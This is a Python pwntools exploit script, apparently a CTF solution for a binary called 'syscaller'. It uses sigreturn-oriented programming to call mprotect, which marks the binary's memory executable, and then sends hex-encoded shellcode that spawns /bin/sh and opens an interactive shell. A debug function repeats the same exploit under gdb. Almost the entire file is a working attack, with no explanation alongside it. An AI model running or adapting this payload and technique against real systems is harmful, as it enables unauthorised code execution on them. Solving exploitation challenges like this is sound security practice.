#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-08-03 20:10:21
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p64

context.arch = "amd64"

filename = "./syscaller"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    target_process.recvline()

    # gadgets
    syscall_address = 0x400104
    write_location = 0x400130
    fake_rsp = 0x40011a
    nops = unhex(b'90'*10)
    shellcode = unhex('6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05')

    pops = p64(0x0)      # pop r12
    pops += p64(0x0)     # pop r11
    pops += p64(0x0)     # pop rdi
    pops += p64(0xf)     # pop rax
    pops += p64(0x0)     # pop rbx
    pops += p64(0x0)     # pop rdx
    pops += p64(0x0)     # pop rsi
    pops += p64(0x0)     # pop rdi

    sig_ret_frame1 = SigreturnFrame()
    sig_ret_frame1.rax = 0xa
    sig_ret_frame1.rdx = 0x7
    sig_ret_frame1.rsi = 0x1000
    sig_ret_frame1.rdi = 0x400000
    sig_ret_frame1.rip = syscall_address
    sig_ret_frame1.rsp = fake_rsp

    sig_ret_frame1_bytes = bytes(sig_ret_frame1)
    
    payload = pops + sig_ret_frame1_bytes

    trash = cyclic(0x200 - len(payload))
    
    target_process.send(payload + trash)

    target_process.send(nops + shellcode)

    target_process.interactive()


def debug():
    script = """
    break _start
    break *0x40011a
    """

    gdb.attach(target_process, gdbscript=script)
    
    target_process.recvline()

    # gadgets
    syscall_address = 0x400104
    write_location = 0x400130
    fake_rsp = 0x40011a
    nops = unhex(b'90'*10)
    shellcode = unhex('6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05')

    pops = p64(0x0)      # pop r12
    pops += p64(0x0)     # pop r11
    pops += p64(0x0)     # pop rdi
    pops += p64(0xf)     # pop rax
    pops += p64(0x0)     # pop rbx
    pops += p64(0x0)     # pop rdx
    pops += p64(0x0)     # pop rsi
    pops += p64(0x0)     # pop rdi

    sig_ret_frame1 = SigreturnFrame()
    sig_ret_frame1.rax = 0xa
    sig_ret_frame1.rdx = 0x7
    sig_ret_frame1.rsi = 0x1000
    sig_ret_frame1.rdi = 0x400000
    sig_ret_frame1.rip = syscall_address
    sig_ret_frame1.rsp = fake_rsp

    sig_ret_frame1_bytes = bytes(sig_ret_frame1)
    
    payload = pops + sig_ret_frame1_bytes

    trash = cyclic(0x200 - len(payload))
    pause()
    
    target_process.send(payload + trash)
    pause()

    target_process.send(nops + shellcode)

    target_process.interactive()


if __name__ == "__main__":
    # debug()
    exploit()


